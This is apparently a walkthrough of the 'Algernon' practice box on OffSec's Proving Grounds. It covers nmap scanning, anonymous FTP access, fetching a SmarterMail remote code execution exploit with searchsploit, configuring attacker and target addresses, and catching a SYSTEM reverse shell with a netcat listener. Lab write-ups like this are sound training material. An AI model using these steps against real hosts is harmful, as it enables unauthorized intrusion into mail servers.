# Algernon - Walkthrough

Algernon is an easy box on OFFSECâ€™s Proving Grounds and the community agrees that it is easy difficulty. 

## Recon
Start scanning all ports:
```
nmap -p- 192.168.234.65 -T 5 -v    
```

Scanning only the open doors we found:

```
nmap -sC -sV -Pn 192.168.234.65 -p 21,80,135,139,445,5040,9998,49664,49665,49666,49668,17001  -v
```

## Enumeration

I logged in anonymously to ftp with the login anonymous and no password.
Inside the Logs folder I found a file called 2020.05.12-administrative.log

I downloaded the file containing the following information:

I accessed port 9998, which directed me to an email service called SmarterMail:

## Exploitation
I searched the exploit db for an exploit and found the SmarterMail Build 6985 - Remote Code Execution exploit. I downloaded it with searchsploit:

```
searchsploit -m 49216   
```
Then I edited the exploit by putting in the target's ip and my ip and port that was waiting for the connection:

```
HOST='192.168.234.65'
PORT=17001
LHOST='192.168.45.162'
LPORT=4444
```
I saved the file and started my listener:
```
 nc -lnvp 4444
```
I ran the exploit and got the shell with the user nt authority\system, browsed the host and found the flag on the user administrator's desktop
